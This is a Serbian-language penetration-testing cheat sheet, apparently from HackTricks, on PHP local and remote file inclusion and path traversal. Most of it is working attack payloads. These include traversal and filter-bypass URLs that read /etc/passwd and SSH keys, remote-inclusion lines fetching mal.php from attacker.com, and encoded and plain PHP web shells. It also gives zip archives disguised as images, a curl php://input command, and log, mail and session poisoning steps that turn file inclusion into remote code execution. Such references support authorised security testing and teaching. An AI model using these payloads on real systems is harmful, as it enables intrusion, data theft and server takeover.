# File Inclusion/Path traversal

<details>

<summary><strong>Naučite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi načini podrške HackTricks-u:

* Ako želite da vidite svoju **kompaniju reklamiranu na HackTricks-u** ili **preuzmete HackTricks u PDF formatu** proverite [**PLANOVE ZA PRETPLATU**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvanični PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**Porodicu PEASS**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitteru** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>

<figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

Pridružite se [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) serveru kako biste komunicirali sa iskusnim hakerima i lovcima na bagove!

**Uvidi u Hakovanje**\
Uključite se u sadržaj koji istražuje uzbuđenje i izazove hakovanja

**Vesti o Hakovanju u Realnom Vremenu**\
Budite u toku sa dinamičnim svetom hakovanja kroz vesti i uvide u realnom vremenu

**Najnovije Najave**\
Budite informisani o najnovijim nagradama za pronalaženje bagova i bitnim ažuriranjima platformi

**Pridružite nam se na** [**Discord-u**](https://discord.com/invite/N3FrSbmwdy) i počnite da sarađujete sa vrhunskim hakerima danas!

## Uključivanje datoteka

**Udaljeno Uključivanje Datoteka (RFI):** Datoteka se učitava sa udaljenog servera (Najbolje: Možete napisati kod i server će ga izvršiti). U php-u je ovo **onemogućeno** po podrazumevanim vrednostima (**allow\_url\_include**).\
**Lokalno Uključivanje Datoteka (LFI):** Server učitava lokalnu datoteku.

Ranjivost se javlja kada korisnik na neki način može kontrolisati datoteku koju će server učitati.

Ranjive **PHP funkcije**: require, require\_once, include, include\_once

Zanimljiv alat za iskorišćavanje ove ranjivosti: [https://github.com/kurobeats/fimap](https://github.com/kurobeats/fimap)

## Slepo - Zanimljivo - LFI2RCE datoteke

```python
wfuzz -c -w ./lfi2.txt --hw 0 http://10.10.10.10/nav.php?page=../../../../../../../FUZZ
```

### **Linux**

**Mešanje nekoliko \*nix LFI lista i dodavanje više putanja stvorilo je ovu:**

{% embed url="https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/file_inclusion_linux.txt" %}

Pokušajte takođe da promenite `/` u `\`\
Pokušajte takođe da dodate `../../../../../`

Lista koja koristi nekoliko tehnika za pronalaženje datoteke /etc/password (kako bi se proverilo postojanje ranjivosti) može se pronaći [ovde](https://github.com/xmendez/wfuzz/blob/master/wordlist/vulns/dirTraversal-nix.txt)

### **Windows**

Spajanje različitih wordlisti:

{% embed url="https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/file_inclusion_windows.txt" %}

Pokušajte takođe da promenite `/` u `\`\
Pokušajte takođe da uklonite `C:/` i dodate `../../../../../`

Lista koja koristi nekoliko tehnika za pronalaženje datoteke /boot.ini (kako bi se proverilo postojanje ranjivosti) može se pronaći [ovde](https://github.com/xmendez/wfuzz/blob/master/wordlist/vulns/dirTraversal-win.txt)

### **OS X**

Proverite LFI listu za linux.

## Osnovni LFI i obilazi

Svi primeri su za Lokalnu Inkluziju Datoteka, ali se mogu primeniti i na Udaljenu Inkluziju Datoteka (stranica=[http://myserver.com/phpshellcode.txt\\](http://myserver.com/phpshellcode.txt\)/).

```
http://example.com/index.php?page=../../../etc/passwd
```

### sekvence prolaza bez rekurzije bez uklanjanja

```python
http://example.com/index.php?page=....//....//....//etc/passwd
http://example.com/index.php?page=....\/....\/....\/etc/passwd
http://some.domain.com/static/%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c/etc/passwd
```

### **Nula bajt (%00)**

Bajpas dodavanjem dodatnih karaktera na kraj pruženog stringa (bajpas za: $\_GET\['param']."php")

```
http://example.com/index.php?page=../../../etc/passwd%00
```

Ovo je **rešeno od PHP 5.4**

### **Kodiranje**

Mogli biste koristiti neobična kodiranja poput dvostrukog URL kodiranja (i drugih):

```
http://example.com/index.php?page=..%252f..%252f..%252fetc%252fpasswd
http://example.com/index.php?page=..%c0%af..%c0%af..%c0%afetc%c0%afpasswd
http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd
http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd%00
```

### Iz postojeće fascikle

Možda back-end proverava putanju fascikle:

```python
http://example.com/index.php?page=utils/scripts/../../../../../etc/passwd
```

### Istraživanje direktorijuma fajl sistema na serveru

Fajl sistem servera može se istraživati rekurzivno kako bi se identifikovali direktorijumi, a ne samo fajlovi, koristeći određene tehnike. Ovaj proces uključuje određivanje dubine direktorijuma i ispitivanje postojanja određenih foldera. U nastavku je detaljna metoda za postizanje ovoga:

1. **Odredite Dubinu Direktorijuma:** Utvrdite dubinu trenutnog direktorijuma tako što ćete uspešno dohvatiti fajl `/etc/passwd` (primenljivo ako je server zasnovan na Linuxu). Primer URL-a može biti struktuiran na sledeći način, što ukazuje na dubinu od tri:

```bash
http://example.com/index.php?page=../../../etc/passwd # depth of 3
```

2. **Istražite fascikle:** Dodajte ime sumnjive fascikle (npr. `private`) na URL, zatim se vratite na `/etc/passwd`. Dodatni nivo direktorijuma zahteva povećanje dubine za jedan:

```bash
http://example.com/index.php?page=private/../../../../etc/passwd # depth of 3+1=4
```

3. **Tumačenje rezultata:** Odgovor servera ukazuje da li folder postoji:

* **Greška / Bez izlaza:** Folder `private` verovatno ne postoji na navedenoj lokaciji.
* **Sadržaj `/etc/passwd`:** Potvrđeno je postojanje foldera `private`.

4. **Rekurzivno istraživanje:** Otkriveni folderi mogu se dodatno istražiti za poddirektorijume ili fajlove koristeći istu tehniku ili tradicionalne metode lokalne uključenosti fajlova (LFI).

Za istraživanje direktorijuma na različitim lokacijama u fajl sistemu, prilagodite payload prema potrebi. Na primer, da proverite da li `/var/www/` sadrži direktorijum `private` (pretpostavljajući da je trenutni direktorijum na dubini od 3), koristite:

```bash
http://example.com/index.php?page=../../../var/www/private/../../../etc/passwd
```

### **Tehnika skraćivanja putanje**

Skraćivanje putanje je metoda koja se koristi za manipulaciju putanjama datoteka u veb aplikacijama. Često se koristi za pristup ograničenim datotekama zaobilazeći određene sigurnosne mere koje dodaju dodatne karaktere na kraj putanje datoteke. Cilj je da se oblikuje putanja datoteke koja, kada je promenjena sigurnosnom merom, i dalje pokazuje ka željenoj datoteci.

U PHP-u, različite reprezentacije putanje datoteke mogu se smatrati ekvivalentnim zbog prirode fajl sistema. Na primer:

* `/etc/passwd`, `/etc//passwd`, `/etc/./passwd` i `/etc/passwd/` se tretiraju kao ista putanja.
* Kada su poslednjih 6 karaktera `passwd`, dodavanje `/` (čineći `passwd/`) ne menja ciljanu datoteku.
* Slično, ako se `.php` doda na putanju datoteke (kao što je `shellcode.php`), dodavanje `/.` na kraj neće promeniti pristupanu datoteku.

Pruženi primeri demonstriraju kako iskoristiti skraćivanje putanje da bi se pristupilo `/etc/passwd`, čestoj meti zbog osetljivog sadržaja (informacije o korisničkim nalozima):

```
http://example.com/index.php?page=a/../../../../../../../../../etc/passwd......[ADD MORE]....
http://example.com/index.php?page=a/../../../../../../../../../etc/passwd/././.[ADD MORE]/././.
```

```
http://example.com/index.php?page=a/./.[ADD MORE]/etc/passwd
http://example.com/index.php?page=a/../../../../[ADD MORE]../../../../../etc/passwd
```

U ovim scenarijima, broj potrebnih prolaza može biti oko 2027, ali taj broj može varirati na osnovu konfiguracije servera.

* **Korišćenje tačkastih segmenata i dodatnih karaktera**: Sekvence prolaza (`../`) kombinovane sa dodatnim tačkastim segmentima i karakterima mogu se koristiti za navigaciju kroz sistem datoteka, efikasno ignorišući dodate stringove od strane servera.
* **Određivanje potrebnog broja prolaza**: Kroz isprobavanje, može se pronaći precizan broj sekvenci `../` potrebnih za navigaciju do korenskog direktorijuma, a zatim do `/etc/passwd`, osiguravajući da su neutralisani svi dodati stringovi (poput `.php`), ali da željena putanja (`/etc/passwd`) ostane netaknuta.
* **Početak sa lažnim direktorijumom**: Uobičajena praksa je započeti putanju sa nepostojećim direktorijumom (kao što je `a/`). Ova tehnika se koristi kao preventivna mera ili da bi se ispunili zahtevi logike parsiranja putanje servera.

Prilikom korišćenja tehnika skraćivanja putanje, ključno je razumeti ponašanje parsiranja putanje servera i strukturu sistema datoteka. Svaki scenario može zahtevati drugačiji pristup, a testiranje je često neophodno kako bi se pronašla najefikasnija metoda.

**Ova ranjivost je ispravljena u PHP 5.3.**

### **Trikovi za zaobilaženje filtera**

```
http://example.com/index.php?page=....//....//etc/passwd
http://example.com/index.php?page=..///////..////..//////etc/passwd
http://example.com/index.php?page=/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd
Maintain the initial path: http://example.com/index.php?page=/var/www/../../etc/passwd
http://example.com/index.php?page=PhP://filter
```

## Udaljeno uključivanje datoteka

U php-u je ovo onemogućeno po podrazumevanim postavkama jer je **`allow_url_include`** podešen na **Isključeno.** Morate ga postaviti na **Uključeno** da biste omogućili ovu funkcionalnost, i u tom slučaju možete uključiti PHP datoteku sa svog servera i dobiti RCE:

```python
http://example.com/index.php?page=http://atacker.com/mal.php
http://example.com/index.php?page=\\attacker.com\shared\mal.php
```

Ako je iz nekog razloga **`allow_url_include`** podešen na **On**, ali PHP **filtrira** pristup spoljnim veb stranicama, [prema ovom postu](https://matan-h.com/one-lfi-bypass-to-rule-them-all-using-base64/), možete koristiti na primer protokol podataka sa base64 da dekodirate b64 PHP kod i dobijete RCE:

{% code overflow="wrap" %}
```
PHP://filter/convert.base64-decode/resource=data://plain/text,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+.txt
```
{% endcode %}

{% hint style="info" %}
U prethodnom kodu, konačni `+.txt` je dodat jer napadaču treba string koji se završava sa `.txt`, tako da string završava sa tim i nakon b64 dekodiranja taj deo će vratiti samo smeće, a pravi PHP kod će biti uključen (i stoga, izvršen).
{% endhint %}

Još jedan primer **ne koristeći `php://` protokol** bio bi:

```
data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+txt
```

## Python Root element

U Pythonu u kodu poput ovog:

```python
# file_name is controlled by a user
os.path.join(os.getcwd(), "public", file_name)
```

Ako korisnik prosledi **apsolutnu putanju** do **`file_name`**, **prethodna putanja se jednostavno uklanja**:

```python
os.path.join(os.getcwd(), "public", "/etc/passwd")
'/etc/passwd'
```

To je željeno ponašanje prema [dokumentaciji](https://docs.python.org/3.10/library/os.path.html#os.path.join):

> Ako je komponenta apsolutna putanja, sve prethodne komponente se odbacuju i spajanje se nastavlja od apsolutne putanje komponente.

## Java Listanje direktorijuma

Izgleda da ako imate Traversiranje putanje u Javi i **zatražite direktorijum** umesto fajla, **vraća se lista direktorijuma**. Ovo se neće događati u drugim jezicima (koliko ja znam).

## Top 25 parametara

Evo liste od 25 najvažnijih parametara koji bi mogli biti ranjivi na lokalno uključivanje fajlova (LFI) (sa [linka](https://twitter.com/trbughunters/status/1279768631845494787)):

```
?cat={payload}
?dir={payload}
?action={payload}
?board={payload}
?date={payload}
?detail={payload}
?file={payload}
?download={payload}
?path={payload}
?folder={payload}
?prefix={payload}
?include={payload}
?page={payload}
?inc={payload}
?locate={payload}
?show={payload}
?doc={payload}
?site={payload}
?type={payload}
?view={payload}
?content={payload}
?document={payload}
?layout={payload}
?mod={payload}
?conf={payload}
```

## LFI / RFI korišćenjem PHP omotača i protokola

### php://filter

PHP filteri omogućavaju obavljanje osnovnih **operacija modifikacije podataka** pre nego što se pročitaju ili napišu. Postoje 5 kategorija filtera:

* [Filteri za stringove](https://www.php.net/manual/en/filters.string.php):
* `string.rot13`
* `string.toupper`
* `string.tolower`
* `string.strip_tags`: Uklanja tagove iz podataka (sve između "<" i ">" znakova)
* Imajte na umu da je ovaj filter nestao iz modernih verzija PHP-a
* [Filteri za konverziju](https://www.php.net/manual/en/filters.convert.php)
* `convert.base64-encode`
* `convert.base64-decode`
* `convert.quoted-printable-encode`
* `convert.quoted-printable-decode`
* `convert.iconv.*` : Transformiše u drugo kodiranje (`convert.iconv.<input_enc>.<output_enc>`). Da biste dobili **listu svih podržanih kodiranja**, pokrenite u konzoli: `iconv -l`

{% hint style="warning" %}
Zloupotrebom `convert.iconv.*` filtera za konverziju možete **generisati proizvoljan tekst**, što može biti korisno za pisanje proizvoljnog teksta ili izvršavanje funkcije poput uključivanja proizvoljnog teksta. Za više informacija pogledajte [**LFI2RCE putem php filtera**](lfi2rce-via-php-filters.md).
{% endhint %}

* [Filteri za kompresiju](https://www.php.net/manual/en/filters.compression.php)
* `zlib.deflate`: Kompresuje sadržaj (korisno ako se izvlači puno informacija)
* `zlib.inflate`: Dekompresuje podatke
* [Filteri za enkripciju](https://www.php.net/manual/en/filters.encryption.php)
* `mcrypt.*` : Zastarelo
* `mdecrypt.*` : Zastarelo
* Ostali filteri
* Pokretanjem `var_dump(stream_get_filters());` u PHP-u možete pronaći nekoliko **neočekivanih filtera**:
* `consumed`
* `dechunk`: vraća HTTP chunked kodiranje
* `convert.*`

```php
# String Filters
## Chain string.toupper, string.rot13 and string.tolower reading /etc/passwd
echo file_get_contents("php://filter/read=string.toupper|string.rot13|string.tolower/resource=file:///etc/passwd");
## Same chain without the "|" char
echo file_get_contents("php://filter/string.toupper/string.rot13/string.tolower/resource=file:///etc/passwd");
## string.string_tags example
echo file_get_contents("php://filter/string.strip_tags/resource=data://text/plain,<b>Bold</b><?php php code; ?>lalalala");

# Conversion filter
## B64 decode
echo file_get_contents("php://filter/convert.base64-decode/resource=data://plain/text,aGVsbG8=");
## Chain B64 encode and decode
echo file_get_contents("php://filter/convert.base64-encode|convert.base64-decode/resource=file:///etc/passwd");
## convert.quoted-printable-encode example
echo file_get_contents("php://filter/convert.quoted-printable-encode/resource=data://plain/text,£hellooo=");
=C2=A3hellooo=3D
## convert.iconv.utf-8.utf-16le
echo file_get_contents("php://filter/convert.iconv.utf-8.utf-16le/resource=data://plain/text,trololohellooo=");

# Compresion Filter
## Compress + B64
echo file_get_contents("php://filter/zlib.deflate/convert.base64-encode/resource=file:///etc/passwd");
readfile('php://filter/zlib.inflate/resource=test.deflated'); #To decompress the data locally
# note that PHP protocol is case-inselective (that's mean you can use "PhP://" and any other varient)
```

{% hint style="warning" %}
Deo "php://filter" je neosetljiv na velika i mala slova
{% endhint %}

### Korišćenje php filtera kao orakula za čitanje proizvoljnih fajlova

[**U ovom postu**](https://www.synacktiv.com/publications/php-filter-chains-file-read-from-error-based-oracle) je predložena tehnika za čitanje lokalnog fajla bez dobijanja izlaza od servera. Ova tehnika se zasniva na **boolean eksfiltraciji fajla (po karakter) korišćenjem php filtera** kao orakula. Ovo je zato što se php filteri mogu koristiti da naprave tekst dovoljno velik da izazovu izuzetak u php-u.

U originalnom postu možete pronaći detaljno objašnjenje tehnike, ali evo brzog sažetka:

* Koristite kod **`UCS-4LE`** da ostavite vodeći karakter teksta na početku i da povećate veličinu stringa eksponencijalno.
* Ovo će se koristiti da generišemo **tekst toliko velik da kada se tačno pogodi početno slovo**, php će izazvati **grešku**
* Filter **dechunk** će **ukloniti sve ako prvi karakter nije heksadecimalan**, tako da možemo znati da li je prvi karakter heksadecimalan.
* Ovo, zajedno sa prethodnim (i drugim filterima u zavisnosti od pogodjenog slova), će nam omogućiti da pogodimo slovo na početku teksta tako što ćemo videti kada uradimo dovoljno transformacija da ono više ne bude heksadecimalan karakter. Jer ako je heks, dechunk ga neće obrisati i početna bomba će izazvati php grešku.
* Kod **convert.iconv.UNICODE.CP930** transformiše svako slovo u sledeće (tako da nakon ovog koda: a -> b). Ovo nam omogućava da otkrijemo da li je prvo slovo `a` na primer, jer ako primenimo 6 ovih kodova a->b->c->d->e->f->g slovo više nije heksadecimalan karakter, stoga dechunk ga neće obrisati i php greška će biti izazvana jer se množi sa početnom bombom.
* Korišćenjem drugih transformacija poput **rot13** na početku moguće je procuriti druge karaktere poput n, o, p, q, r (i druge kodove mogu se koristiti da se druga slova prebace u heks opseg).
* Kada je početni karakter broj, potrebno ga je enkodovati u base64 i procuriti prva 2 slova da bi se procurio broj.
* Konačni problem je videti **kako procuriti više od početnog slova**. Korišćenjem filtera za redosled memorije kao što su **convert.iconv.UTF16.UTF-16BE, convert.iconv.UCS-4.UCS-4LE, convert.iconv.UCS-4.UCS-4LE** moguće je promeniti redosled karaktera i dobiti na prvoj poziciji druga slova teksta.
* I kako bi se mogli dobiti **dodatni podaci**, ideja je da se **generiše 2 bajta beskorisnih podataka na početku** sa **convert.iconv.UTF16.UTF16**, primeni se **UCS-4LE** da bi se oni **povezali sa sledeća 2 bajta**, i **obrišu podaci do beskorisnih podataka** (ovo će ukloniti prva 2 bajta početnog teksta). Nastaviti sa ovim sve dok se ne dostigne željeni bit koji treba procuriti.

U postu je takođe procuran alat za automatsko izvođenje ovoga: [php\_filters\_chain\_oracle\_exploit](https://github.com/synacktiv/php\_filter\_chains\_oracle\_exploit).

### php://fd

Ovaj omotač omogućava pristup deskriptorima fajlova koje proces ima otvorene. Potencijalno korisno za eksfiltraciju sadržaja otvorenih fajlova:

```php
echo file_get_contents("php://fd/3");
$myfile = fopen("/etc/passwd", "r");
```

Možete koristiti **php://stdin, php://stdout i php://stderr** da pristupite **file descriptorima 0, 1 i 2** redom (nisam siguran kako bi ovo moglo biti korisno u napadu)

### zip:// i rar://

Postavite Zip ili Rar fajl sa PHPShell-om unutra i pristupite mu.\
Da biste mogli zloupotrebiti rar protokol, **potrebno je da bude posebno aktiviran**.

```bash
echo "<pre><?php system($_GET['cmd']); ?></pre>" > payload.php;
zip payload.zip payload.php;
mv payload.zip shell.jpg;
rm payload.php

http://example.com/index.php?page=zip://shell.jpg%23payload.php

# To compress with rar
rar a payload.rar payload.php;
mv payload.rar shell.jpg;
rm payload.php
http://example.com/index.php?page=rar://shell.jpg%23payload.php
```

### data://

### data://

```
http://example.net/?page=data://text/plain,<?php echo base64_encode(file_get_contents("index.php")); ?>
http://example.net/?page=data://text/plain,<?php phpinfo(); ?>
http://example.net/?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=
http://example.net/?page=data:text/plain,<?php echo base64_encode(file_get_contents("index.php")); ?>
http://example.net/?page=data:text/plain,<?php phpinfo(); ?>
http://example.net/?page=data:text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=
NOTE: the payload is "<?php system($_GET['cmd']);echo 'Shell done !'; ?>"
```

Napomena da je ovaj protokol ograničen php konfiguracijama **`allow_url_open`** i **`allow_url_include`**

### expect://

Expect mora biti aktiviran. Možete izvršiti kod koristeći ovo:

```
http://example.com/index.php?page=expect://id
http://example.com/index.php?page=expect://ls
```

### input://

Navedite svoj payload u POST parametrima:

```bash
curl -XPOST "http://example.com/index.php?page=php://input" --data "<?php system('id'); ?>"
```

### phar://

`.phar` datoteka može se koristiti za izvršavanje PHP koda kada web aplikacija koristi funkcije poput `include` za učitavanje datoteka. PHP kodni odlomak prikazan u nastavku demonstrira kreiranje `.phar` datoteke:

```php
<?php
$phar = new Phar('test.phar');
$phar->startBuffering();
$phar->addFromString('test.txt', 'text');
$phar->setStub('<?php __HALT_COMPILER(); system("ls"); ?>');
$phar->stopBuffering();
```

Za kompajliranje `.phar` datoteke, treba izvršiti sledeću komandu:

```bash
php --define phar.readonly=0 create_path.php
```

Prilikom izvršavanja, biće kreiran fajl pod nazivom `test.phar`, koji potencijalno može biti iskorišćen za eksploataciju ranjivosti lokalnog uključivanja fajlova (LFI).

U slučajevima kada LFI samo vrši čitanje fajlova bez izvršavanja PHP koda unutar njih, kroz funkcije poput `file_get_contents()`, `fopen()`, `file()`, `file_exists()`, `md5_file()`, `filemtime()`, ili `filesize()`, može se pokušati eksploatisati ranjivost de-serijalizacije. Ova ranjivost je povezana sa čitanjem fajlova korišćenjem `phar` protokola.

Za detaljnije razumevanje eksploatacije ranjivosti de-serijalizacije u kontekstu fajlova sa ekstenzijom `.phar`, pogledajte dokument koji je povezan ispod:

[Phar Vodič za Eksploataciju De-serijalizacije](phar-deserialization.md)

{% content-ref url="phar-deserialization.md" %}
[phar-deserialization.md](phar-deserialization.md)
{% endcontent-ref %}

### Više protokola

Proverite više mogućih [**protokola za uključivanje ovde**](https://www.php.net/manual/en/wrappers.php)**:**

* [php://memory i php://temp](https://www.php.net/manual/en/wrappers.php.php#wrappers.php.memory) — Pisanje u memoriju ili u privremeni fajl (nije sigurno kako bi ovo moglo biti korisno u napadu uključivanja fajlova)
* [file://](https://www.php.net/manual/en/wrappers.file.php) — Pristupanje lokalnom fajl sistemu
* [http://](https://www.php.net/manual/en/wrappers.http.php) — Pristupanje HTTP(s) URL-ovima
* [ftp://](https://www.php.net/manual/en/wrappers.ftp.php) — Pristupanje FTP(s) URL-ovima
* [zlib://](https://www.php.net/manual/en/wrappers.compression.php) — Streamovi kompresije
* [glob://](https://www.php.net/manual/en/wrappers.glob.php) — Pronalaženje putanja koje se podudaraju sa obrascem (Ne vraća ništa štampabilno, pa nije zaista korisno ovde)
* [ssh2://](https://www.php.net/manual/en/wrappers.ssh2.php) — Secure Shell 2
* [ogg://](https://www.php.net/manual/en/wrappers.audio.php) — Audio streamovi (Nije korisno za čitanje proizvoljnih fajlova)

## LFI putem 'assert' funkcije u PHP-u

Rizici lokalnog uključivanja fajlova (LFI) u PHP-u su posebno visoki prilikom rukovanja 'assert' funkcijom, koja može izvršiti kod unutar stringova. Ovo je posebno problematično ako se ulaz koji sadrži karaktere pretrage direktorijuma poput ".." proverava, ali nije pravilno dezinfikovan.

Na primer, PHP kod može biti dizajniran da spreči pretragu direktorijuma na sledeći način:

```bash
assert("strpos('$file', '..') === false") or die("");
```

Iako ovo ima za cilj da zaustavi prolazak, nenamerno stvara vektor za ubacivanje koda. Da bi iskoristio ovo za čitanje sadržaja datoteke, napadač bi mogao koristiti:

```plaintext
' and die(highlight_file('/etc/passwd')) or '
```

Slično, za izvršavanje proizvoljnih sistemskih komandi, može se koristiti:

```plaintext
' and die(system("id")) or '
```

Važno je **URL-kodirati ove payload-e**.

<figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

Pridružite se [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) serveru kako biste komunicirali sa iskusnim hakerima i lovcima na bagove!

**Hakerski uvidi**\
Uključite se u sadržaj koji istražuje uzbuđenje i izazove hakovanja

**Vesti o hakovanju u realnom vremenu**\
Budite u toku sa dinamičnim svetom hakovanja putem vesti i uvida u realnom vremenu

**Poslednje najave**\
Budite informisani o najnovijim nagradama za pronalaženje bagova i važnim ažuriranjima platforme

**Pridružite nam se na** [**Discord-u**](https://discord.com/invite/N3FrSbmwdy) i počnite da sarađujete sa vrhunskim hakerima danas!

## PHP Slepa putanja prolaza

{% hint style="warning" %}
Ova tehnika je relevantna u slučajevima kada **kontrolišete** **putanju datoteke** PHP funkcije koja će **pristupiti datoteci** ali nećete videti sadržaj datoteke (kao jednostavan poziv **`file()`**) ali sadržaj nije prikazan.
{% endhint %}

U [**ovom neverovatnom postu**](https://www.synacktiv.com/en/publications/php-filter-chains-file-read-from-error-based-oracle.html) objašnjeno je kako se slepa putanja prolaza može zloupotrebiti putem PHP filtera da bi se **eksfiltrirao sadržaj datoteke putem greške orakla**.

U suštini, tehnika koristi **"UCS-4LE" kodiranje** da bi sadržaj datoteke bio toliko **veliki** da će **PHP funkcija koja otvara** datoteku izazvati **grešku**.

Zatim, kako bi se otkrio prvi karakter, filter **`dechunk`** se koristi zajedno sa drugim kao što su **base64** ili **rot13** i na kraju se koriste filteri **convert.iconv.UCS-4.UCS-4LE** i **convert.iconv.UTF16.UTF-16BE** da bi se **postavili drugi karakteri na početak i otkrili ih**.

**Funkcije koje mogu biti ranjive**: `file_get_contents`, `readfile`, `finfo->file`, `getimagesize`, `md5_file`, `sha1_file`, `hash_file`, `file`, `parse_ini_file`, `copy`, `file_put_contents (samo cilj čitanja samo ovim)`, `stream_get_contents`, `fgets`, `fread`, `fgetc`, `fgetcsv`, `fpassthru`, `fputs`

Za tehničke detalje pogledajte pomenuti post!

## LFI2RCE

### Udaljeno uključivanje datoteka

Objašnjeno ranije, [**pratite ovaj link**](./#remote-file-inclusion).

### Putem Apache/Nginx log datoteke

Ako je Apache ili Nginx server **ranjiv na LFI** unutar funkcije uključivanja, možete pokušati pristupiti **`/var/log/apache2/access.log` ili `/var/log/nginx/access.log`**, postaviti unutar **korisničkog agenta** ili unutar **GET parametra** PHP shell poput **`<?php system($_GET['c']); ?>`** i uključiti tu datoteku

{% hint style="warning" %}
Imajte na umu da **ako koristite dvostruke navodnike** za shell umesto **jednostrukih navodnika**, dvostruki navodnici će biti izmenjeni u string "_**quote;**_", **PHP će baciti grešku** tamo i **ništa drugo neće biti izvršeno**.

Takođe, pobrinite se da **ispravno napišete payload** ili će PHP greška svaki put kada pokuša da učita log datoteku i nećete imati drugu priliku.
{% endhint %}

Ovo takođe može biti urađeno i u drugim logovima ali **budite oprezni,** kod unutar logova može biti URL kodiran i to može uništiti Shell. Zaglavlje **autorizacija "osnovna"** sadrži "korisnik:lozinka" u Base64 i dekodira se unutar logova. PHPShell može biti ubačen unutar ovog zaglavlja.\
Drugi mogući putanje logova:

```python
/var/log/apache2/access.log
/var/log/apache/access.log
/var/log/apache2/error.log
/var/log/apache/error.log
/usr/local/apache/log/error_log
/usr/local/apache2/log/error_log
/var/log/nginx/access.log
/var/log/nginx/error.log
/var/log/httpd/error_log
```

### Putem e-pošte

**Pošaljite e-poštu** na interni nalog (user@localhost) koja sadrži vaš PHP payload poput `<?php echo system($_REQUEST["cmd"]); ?>` i pokušajte da je uključite u e-poštu korisnika sa putanjom poput **`/var/mail/<USERNAME>`** ili **`/var/spool/mail/<USERNAME>`**

### Putem /proc/\*/fd/\*

1. Otpremite mnogo shell skripti (na primer: 100)
2. Uključite [http://example.com/index.php?page=/proc/$PID/fd/$FD](http://example.com/index.php?page=/proc/$PID/fd/$FD), gde je $PID PID procesa (može se nasilno otkriti) i $FD deskriptor datoteke (takođe se može nasilno otkriti)

### Putem /proc/self/environ

Kao datoteka sa zapisima, pošaljite payload u User-Agent, biće reflektovan unutar datoteke /proc/self/environ

```
GET vulnerable.php?filename=../../../proc/self/environ HTTP/1.1
User-Agent: <?=phpinfo(); ?>
```

### Preko otpreme

Ako možete da otpremite datoteku, jednostavno ubacite shell payload u nju (npr: `<?php system($_GET['c']); ?>`).

```
http://example.com/index.php?page=path/to/uploaded/file.png
```

Kako biste zadržali čitljivost datoteke, najbolje je ubaciti u metapodatke slika/doc/pdf

### Putem otpremanja Zip fajla

Otpremite ZIP fajl koji sadrži komprimiranu PHP ljusku i pristupite:

```python
example.com/page.php?file=zip://path/to/zip/hello.zip%23rce.php
```

### Preko PHP sesija

Proverite da li veb sajt koristi PHP sesije (PHPSESSID)

```
Set-Cookie: PHPSESSID=i56kgbsq9rm8ndg3qbarhsbm27; path=/
Set-Cookie: user=admin; expires=Mon, 13-Aug-2018 20:21:29 GMT; path=/; httponly
```

U PHP-u, ove sesije se čuvaju u datotekama _/var/lib/php5/sess\\_\[PHPSESSID]\_.

```
/var/lib/php5/sess_i56kgbsq9rm8ndg3qbarhsbm27.
user_ip|s:0:"";loggedin|s:0:"";lang|s:9:"en_us.php";win_lin|s:0:"";user|s:6:"admin";pass|s:6:"admin";
```

Postavite kolačić na `<?php system('cat /etc/passwd');?>`

```
login=1&user=<?php system("cat /etc/passwd");?>&pass=password&lang=en_us.php
```

Koristite LFI da biste uključili PHP sesijski fajl

```
login=1&user=admin&pass=password&lang=/../../../../../../../../../var/lib/php5/sess_i56kgbsq9rm8ndg3qbarhsbm2
```

### Preko ssh

Ako je ssh aktivan, proverite koji se korisnik koristi (/proc/self/status & /etc/passwd) i pokušajte pristupiti **\<HOME>/.ssh/id\_rsa**

### **Preko** **vsftpd** _**logova**_

Logovi za FTP server vsftpd se nalaze na _**/var/log/vsftpd.log**_. U scenariju gde postoji ranjivost lokalnog uključivanja datoteka (LFI), i pristup izloženom vsftpd serveru je moguć, mogu se razmotriti sledeći koraci:

1. Ubacite PHP payload u polje za korisničko ime tokom procesa prijave.
2. Nakon ubacivanja, iskoristite LFI da biste dobili server logove sa _**/var/log/vsftpd.log**_.

### Preko php base64 filtera (koristeći base64)

Kao što je prikazano u [ovom](https://matan-h.com/one-lfi-bypass-to-rule-them-all-using-base64) članku, PHP base64 filter jednostavno ignoriše Non-base64. Možete koristiti to da biste zaobišli proveru ekstenzije datoteke: ako dostavite base64 koji se završava sa ".php", on bi jednostavno ignorisao "." i dodao "php" na base64. Evo primera payload-a:

```url
http://example.com/index.php?page=PHP://filter/convert.base64-decode/resource=data://plain/text,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+.php

NOTE: the payload is "<?php system($_GET['cmd']);echo 'Shell done !'; ?>"
```

